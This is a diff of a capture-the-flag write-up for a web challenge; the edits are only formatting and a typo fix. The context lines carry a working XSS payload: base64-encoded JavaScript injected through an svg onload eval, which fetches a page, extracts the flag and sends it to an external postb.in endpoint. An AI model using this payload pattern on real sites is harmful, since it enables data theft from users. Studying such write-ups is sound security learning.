@@ -84,7 +84,7 @@ Huzzah! Check out the HTML `<code>` block below. It contains our scipt.
 Now that we tested the WAF above. Lets research some method in javascript to render another webpage. This [site](https://www.freecodecamp.org/news/here-is-the-most-popular-ways-to-make-an-http-request-in-javascript-954ce8c95aaa/) details four methods for making calls to websites in javascript. We will start by modifying the ajax `XMLHttpRequest()` method.
 
 Modify our base code block to use the URL for the website containing the flag.
-```
+```javascript
 const Http = new XMLHttpRequest();
 const url='http://challenge.acictf.com:55351/article/1';
 Http.open("GET", url);
@@ -122,7 +122,7 @@ I am more familiar with pcre. I needed to play around with javascript regex to g
 Go to https://postb.in/ and Create a bin.
 
 Modify our payload to include the flag regex and the callback to our postb.in endpoint.
-```
+```javascript
 const Http = new XMLHttpRequest();
 const url='http://challenge.acictf.com:55351/article/1';
 Http.open("GET", url);
@@ -147,7 +147,7 @@ So my fixed payload is:
 Y29uc3QgSHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwpjb25zdCB1cmw9J2h0dHA6Ly9jaGFsbGVuZ2UuYWNpY3RmLmNvbTo1NTM1MS9hcnRpY2xlLzEnOwpIdHRwLm9wZW4oIkdFVCIsIHVybCk7Ckh0dHAuc2VuZCgpOwoKSHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSAoZSkgPT4gewogICAgZmxhZyA9IEh0dHAucmVzcG9uc2VUZXh0Lm1hdGNoKC9BQ0l7Lip9L2cpOwogICAgd2luZG93LmxvY2F0aW9uID0gJ2h0dHBzOi8vcG9zdGIuaW4vMTU4OTIyNjA5MDc1MC0yMDA2NjM3MDI1NjI0P2ZsYWc9JyArIGZsYWc7Cn0%3D
 ```
 
-Now lets build the entire URL.
+Now let's build the entire URL.
 ```
 http://challenge.acictf.com:55351/search?search=1&%3Csvg%0Conload%3D"eval(atob(`'+Y29uc3QgSHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwpjb25zdCB1cmw9J2h0dHA6Ly9jaGFsbGVuZ2UuYWNpY3RmLmNvbTo1NTM1MS9hcnRpY2xlLzEnOwpIdHRwLm9wZW4oIkdFVCIsIHVybCk7Ckh0dHAuc2VuZCgpOwoKSHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSAoZSkgPT4gewogICAgZmxhZyA9IEh0dHAucmVzcG9uc2VUZXh0Lm1hdGNoKC9BQ0l7Lip9L2cpOwogICAgd2luZG93LmxvY2F0aW9uID0gJ2h0dHBzOi8vcG9zdGIuaW4vMTU4OTIyNjA5MDc1MC0yMDA2NjM3MDI1NjI0P2ZsYWc9JyArIGZsYWc7Cn0%3D+'`))"%3E=<script>
 ```
